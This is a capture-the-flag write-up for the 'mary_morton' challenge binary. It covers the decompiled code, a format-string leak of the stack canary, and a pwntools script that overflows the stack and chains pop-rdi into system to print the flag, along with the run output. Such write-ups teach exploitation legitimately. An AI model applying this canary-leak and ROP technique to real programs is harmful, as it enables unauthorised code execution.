# checkpoint



# analyze
```shell
➜  AsisFinals2017_mary_morton ./mary_morton 
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 

➜  AsisFinals2017_mary_morton file ./mary_morton 
./mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
➜  AsisFinals2017_mary_morton checksec ./mary_morton 
[*] '/home/pitta/workspace/pwn_learn/rec0rd/draftBin/AsisFinals2017_mary_morton/mary_morton'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

```

**IDA view**
```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int opNum; // [rsp+24h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_4009FF();
  puts("Welcome to the battle ! ");
  puts("[Great Fairy] level pwned ");
  puts("Select your weapon ");
  while ( 1 )
  {
    while ( 1 )
    {
      welcomeMsg();
      __isoc99_scanf("%d", &opNum);
      if ( opNum != 2 )
        break;
      fmtString();                              // fmtString as weapon
    }
    if ( opNum == 3 )
    {
      puts("Bye ");
      exit(0);
    }
    if ( opNum == 1 )
      stackOverflow();                          // stack bufferoverflow as weapon
    else
      puts("Wrong!");
  }
}
```
**main -> fmtString()**
```c
unsigned __int64 fmtString()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 canary; // [rsp+88h] [rbp-8h]        // able to leak canary

  canary = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x7FuLL);
  printf(buf);
  return __readfsqword(0x28u) ^ canary;
}
```
**main -> stackOverflow()**
```c
unsigned __int64 stackOverflow()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 canary; // [rsp+88h] [rbp-8h]

  canary = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x100uLL);
  printf("-> %s\n", buf);
  return __readfsqword(0x28u) ^ canary;
}
```

**also catFlag function: 0x4008DA**
```c
int catFlag()
{
  return system("/bin/cat ./flag");
}
```

## leak canary by fmtString vuln
**try payload to fmtString: AAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x**
```shell
➜  AsisFinals2017_mary_morton ./mary_morton    
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
AAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAAAAA.27998a60.7f.4690f360.0.0.41414141.2e78252e.78252e78.252e7825.2e78252e.78252e78.0       # offset 6
```

**try payload to fmtString: AAAAAAAA.%6$p**
```shell
➜  AsisFinals2017_mary_morton ./mary_morton
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
AAAAAAAA.%6$p
AAAAAAAA.0x4141414141414141
```

**calculate the offset of canary to the fmtstring**
**gdb view**
```shell
=> 0x4008ff:    mov    QWORD PTR [rbp-0x8],rax
   0x400903:    xor    eax,eax
   0x400905:    lea    rdx,[rbp-0x90]
   0x40090c:    mov    eax,0x0
   0x400911:    mov    ecx,0x10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde00 --> 0x7ffff7fda700 (0x00007ffff7fda700)
0008| 0x7fffffffde08 --> 0x0 
0016| 0x7fffffffde10 --> 0x0 
0024| 0x7fffffffde18 --> 0x7ffff7a87419 (<_IO_do_write+121>:    mov    r13,rax)
0032| 0x7fffffffde20 --> 0x13 
0040| 0x7fffffffde28 --> 0x7ffff7dd2620 --> 0xfbad2887 
0048| 0x7fffffffde30 --> 0xa ('\n')
0056| 0x7fffffffde38 --> 0x400b75 ("3. Exit the battle ")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004008ff in ?? ()
gdb-peda$ p $rbp-8
$1 = (void *) 0x7fffffffde88
```
**gdb: b printf in fmtString vuln**
```shell
=> 0x4008ff:    mov    QWORD PTR [rbp-0x8],rax
   0x400903:    xor    eax,eax
   0x400905:    lea    rdx,[rbp-0x90]
   0x40090c:    mov    eax,0x0
   0x400911:    mov    ecx,0x10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde00 --> 0x7ffff7fda700 (0x00007ffff7fda700)
0008| 0x7fffffffde08 --> 0x0 
0016| 0x7fffffffde10 --> 0x0 
0024| 0x7fffffffde18 --> 0x7ffff7a87419 (<_IO_do_write+121>:    mov    r13,rax)
0032| 0x7fffffffde20 --> 0x13 
0040| 0x7fffffffde28 --> 0x7ffff7dd2620 --> 0xfbad2887 
0048| 0x7fffffffde30 --> 0xa ('\n')
0056| 0x7fffffffde38 --> 0x400b75 ("3. Exit the battle ")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004008ff in ?? ()
gdb-peda$ c
Continuing.
AAAAAAAA
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b04360 (<read+16>: cmp    rax,0xfffffffffffff001)
RDX: 0x7f 
RSI: 0x7fffffffde00 ("AAAAAAAA\n")
RDI: 0x7fffffffde00 ("AAAAAAAA\n")
RBP: 0x7fffffffde90 --> 0x7fffffffded0 --> 0x400a50 (push   r15)
RSP: 0x7fffffffddf8 --> 0x400949 (nop)
RIP: 0x7ffff7a62810 (<printf>:  sub    rsp,0xd8)
R8 : 0x0 
R9 : 0x0 
R10: 0x25b 
R11: 0x7ffff7a62810 (<printf>:  sub    rsp,0xd8)
R12: 0x400730 (xor    ebp,ebp)
R13: 0x7fffffffdfb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7a62807 <fprintf+135>:        add    rsp,0xd8
   0x7ffff7a6280e <fprintf+142>:        ret    
   0x7ffff7a6280f:      nop
=> 0x7ffff7a62810 <printf>:     sub    rsp,0xd8
   0x7ffff7a62817 <printf+7>:   test   al,al
   0x7ffff7a62819 <printf+9>:   mov    QWORD PTR [rsp+0x28],rsi
   0x7ffff7a6281e <printf+14>:  mov    QWORD PTR [rsp+0x30],rdx
   0x7ffff7a62823 <printf+19>:  mov    QWORD PTR [rsp+0x38],rcx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddf8 --> 0x400949 (nop)
0008| 0x7fffffffde00 ("AAAAAAAA\n")
0016| 0x7fffffffde08 --> 0xa ('\n')
0024| 0x7fffffffde10 --> 0x0 
0032| 0x7fffffffde18 --> 0x0 
0040| 0x7fffffffde20 --> 0x0 
0048| 0x7fffffffde28 --> 0x0 
0056| 0x7fffffffde30 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x00007ffff7a62810 in printf () from /lib/x86_64-linux-gnu/libc.so.6
gdb-peda$ x/20gx $rsp
0x7fffffffddf8: 0x0000000000400949      0x4141414141414141
0x7fffffffde08: 0x000000000000000a      0x0000000000000000
0x7fffffffde18: 0x0000000000000000      0x0000000000000000
0x7fffffffde28: 0x0000000000000000      0x0000000000000000
0x7fffffffde38: 0x0000000000000000      0x0000000000000000
0x7fffffffde48: 0x0000000000000000      0x0000000000000000
0x7fffffffde58: 0x0000000000000000      0x0000000000000000
0x7fffffffde68: 0x0000000000000000      0x0000000000000000
0x7fffffffde78: 0x0000000000000000      0x0000000000000000
0x7fffffffde88: 0x83d233e393f36c00(*)   0x00007fffffffded0      %23$p   (6+17)
```
**verify canary**
```shell
➜  AsisFinals2017_mary_morton ./mary_morton
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
%23$p
0xe498a2e0b42f2500
➜  AsisFinals2017_mary_morton ./mary_morton
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
%23$p
0x7803a152bf84ff00
```

## refill canary in stackOverflow
```c
unsigned __int64 stackOverflow()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 canary; // [rsp+88h] [rbp-8h]
  //...
}
```

# exploit

```python
from pwn import *

pipe = process("./mary_morton")

system_plt = 0x4006a0
cat_addr = 0x400B2B
pop_rdi_ret = 0x400ab3

def wellcomeMsg():
    print(pipe.recvuntil("3. Exit the battle \n"))


def leakCanary():
    pipe.sendline("2")
    pipe.sendline("%23$p")
    canary = pipe.recvline().decode("utf-8")
    log.info("recv canary: %s" % canary)
    return canary

def stackOverflow(canary):
    payload = "A" * 0x88
    payload += p64(canary)
    payload += "B" * 8
    payload += p64(pop_rdi_ret)
    payload += p64(cat_addr)
    payload += p64(system_plt)

    pipe.sendline("1")
    pipe.sendline(payload)
    log.info(pipe.recvall())


#context.log_level="DEBUG"
wellcomeMsg()
canary = int(leakCanary().encode("utf-8"), 16)
log.info(canary)
stackOverflow(canary)

```

**run exp.py**

```shell
➜  AsisFinals2017_mary_morton python2 ./exp.py
[+] Starting local process './mary_morton': pid 30605
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 

[*] recv canary: 0x172d8bb0309fd700
[*] 1670144625670608640
[+] Receiving all data: Done (250B)
[*] Process './mary_morton' stopped with exit code -11 (SIGSEGV) (pid 30605)
[*] 1. Stack Bufferoverflow Bug 
    2. Format String Bug 
    3. Exit the battle 
    -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    flag{Hellow fmtString & stackOverflow}  # get the Flag
```